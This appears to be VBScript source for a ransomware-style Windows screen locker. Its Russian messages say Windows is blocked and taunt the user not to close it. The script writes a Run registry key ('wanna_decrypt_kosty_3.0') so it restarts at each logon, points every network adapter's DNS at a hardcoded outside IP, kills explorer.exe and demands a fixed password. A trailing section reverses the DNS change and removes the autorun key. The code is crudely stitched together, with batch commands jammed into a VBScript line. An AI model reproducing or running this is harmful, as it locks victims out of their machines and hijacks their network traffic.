Set objShell = CreateObject("WScript.Shell")
Do
If objShell.AppActivate("windows заблокирован") Then
If objShell.SendKeys("%{F4}") Then
MsgBox "даже не пробуй закрыть."
End If
End If
WScript.Sleep 100
Loop
Set objShell = CreateObject("WScript.Shell")
strScriptPath = WScript.ScriptFullName
strScriptName = "wanna_decrypt_kosty_3.0"

If Not objShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & strScriptName) = strScriptPath Then
objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & strScriptName, strScriptPath, "REG_SZ"
End if
strComputer = "."
strDNS1 = "5.181.161.6"

Set objWMIService = GetObject("winmgmts:" _
& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colDNS = objWMIService.ExecQuery _
("Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE")

For Each objDNS in colDNS
objDNS.SetDNSServerSearchOrder Array(strDNS1)
Next
title windows заблокирован: taskkill /f /im explorer.exe >nul Dim password password = InputBox("Введите пароль:") While password <> "9832" password = InputBox("Неверный пароль. Попробуйте снова:") Wend MsgBox "Правильный пароль введен! Доступ разрешен." start explorer.exe
strComputer = "."

Set objWMIService = GetObject("winmgmts:" _

& "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Set colDNS = objWMIService.ExecQuery _
("Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE")

For Each objDNS in colDNS
objDNS.SetDNSServerSearchOrder()
Next
Set objShell = CreateObject("WScript.Shell")
strScriptName = "wanna_decrypt_kosty_3.0"

If objShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & strScriptName) = "" Then
WScript.Echo "Ключ автозапуска не найден."
Else
objShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & strScriptName
WScript.Echo "Ключ автозапуска успешно удален."
End If